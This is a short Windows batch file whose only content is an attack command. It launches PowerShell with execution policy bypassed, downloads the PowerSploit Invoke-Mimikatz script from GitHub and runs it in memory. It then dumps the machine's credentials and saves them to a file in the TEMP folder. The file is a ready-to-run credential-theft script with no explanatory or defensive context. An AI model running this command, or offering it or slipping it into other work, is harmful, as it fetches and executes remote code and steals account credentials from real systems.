@echo OFF
PowerShell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -Command 'IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1');Invoke-Mimikatz -DumpCreds | Out-File "$($Env:TEMP)\output.txt"'